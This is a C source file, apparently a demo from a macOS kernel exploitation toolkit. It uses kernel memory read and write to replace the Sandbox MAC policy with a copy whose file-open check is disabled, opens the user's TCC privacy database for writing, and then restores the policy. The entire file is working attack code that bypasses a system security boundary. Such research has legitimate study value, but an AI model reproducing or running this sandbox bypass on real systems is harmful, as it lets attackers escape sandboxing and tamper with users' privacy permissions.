//
//  main.c
//  demo_sb
//
//  Created by user on 1/7/22.
//

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <limits.h>

#include <sys/fcntl.h>
#include <sys/errno.h>

#include <xe/memory/kmem.h>
#include <xe/memory/kmem_remote.h>
#include <xe/slider/kernel.h>
#include <xe/util/log.h>
#include <xe/allocator/pipe.h>
#include <xe/util/assert.h>


int find_mac_policy_conf(char* mpc_name, uintptr_t* out, int* index_out) {
    uintptr_t mac_policy_list = xe_slider_kernel_slide(VAR_MAC_POLICY_LIST);
    
    uint maxindex = xe_kmem_read_uint32(mac_policy_list, TYPE_MAC_POLICY_LIST_MEM_MAXINDEX_OFFSET);
    uintptr_t entries = xe_kmem_read_uint64(mac_policy_list, TYPE_MAC_POLICY_LIST_MEM_ENTRIES_OFFSET);
    
    for (int i=0; i<maxindex; i++) {
        uintptr_t entry = entries + i * 8;
        uintptr_t mpc = xe_kmem_read_uint64(entry, 0);
        char name[16];
        bzero(name, sizeof(name));
        xe_kmem_read(name, xe_kmem_read_uint64(mpc, TYPE_MAC_POLICY_CONF_MEM_MPC_NAME_OFFSET), 0, sizeof(name));
        
        if (strncmp(mpc_name, name, sizeof(name)) == 0) {
            *out = mpc;
            if (index_out) { *index_out = i; };
            return 0;
        }
    }
    
    return ENOENT;
}


int main(int argc, const char * argv[]) {
    xe_assert_cond(argc, ==, 2);
    struct xe_kmem_backend* backend = xe_kmem_remote_client_create(argv[1]);
    xe_kmem_use_backend(backend);
    xe_slider_kernel_init(xe_kmem_remote_client_get_mh_execute_header(backend));
    
    uintptr_t mac_policy_list = xe_slider_kernel_slide(VAR_MAC_POLICY_LIST);
    uintptr_t mac_policy_entries = xe_kmem_read_uint64(mac_policy_list, TYPE_MAC_POLICY_LIST_MEM_ENTRIES_OFFSET);

    xe_allocator_pipe_t fake_mpc_allocator;
    uintptr_t fake_mpc;
    int error = xe_allocator_pipe_allocate(TYPE_MAC_POLICY_CONF_SIZE, &fake_mpc_allocator, &fake_mpc);
    xe_assert_err(error);

    xe_allocator_pipe_t fake_mpo_allocator;
    uintptr_t fake_mpo;
    error = xe_allocator_pipe_allocate(TYPE_MAC_POLICY_OPS_SIZE, &fake_mpo_allocator, &fake_mpo);
    xe_assert_err(error);

    uintptr_t sandbox_mpc;
    int sandbox_mpc_index;
    error = find_mac_policy_conf("Sandbox", &sandbox_mpc, &sandbox_mpc_index);
    xe_assert_err(error);

    uintptr_t sandbox_mpo = xe_kmem_read_uint64(sandbox_mpc, TYPE_MAC_POLICY_CONF_MEM_MPC_OPS_OFFSET);

    xe_kmem_copy(fake_mpc, sandbox_mpc, TYPE_MAC_POLICY_CONF_SIZE);
    xe_kmem_copy(fake_mpo, sandbox_mpo, TYPE_MAC_POLICY_OPS_SIZE);
    xe_kmem_write_uint64(fake_mpc, TYPE_MAC_POLICY_CONF_MEM_MPC_OPS_OFFSET, fake_mpo);
    xe_kmem_write_uint64(fake_mpo, TYPE_MAC_POLICY_OPS_MEM_MPO_VNODE_CHECK_OPEN_OFFSET, 0);
    
    xe_kmem_write_uint64(mac_policy_entries, sizeof(uintptr_t) * sandbox_mpc_index, fake_mpc);
    
    xe_log_info("patched sandbox policy to skip vnode_open check");
    
    char* home = getenv("HOME");
    char tcc_db[PATH_MAX];
    snprintf(tcc_db, sizeof(tcc_db), "%s/Library/Application Support/com.apple.TCC/tcc.db", home);
    int fd = open(tcc_db, O_RDWR);
    if (fd < 0) {
        xe_log_error("failed to open tcc.db, err: %s", strerror(errno));
    } else {
        xe_log_info("tcc.db open success");
    }
    
    xe_log_info("restoring sandbox policy");
    xe_kmem_write_uint64(mac_policy_entries, sizeof(uintptr_t) * sandbox_mpc_index, sandbox_mpc);
    
    return 0;
}
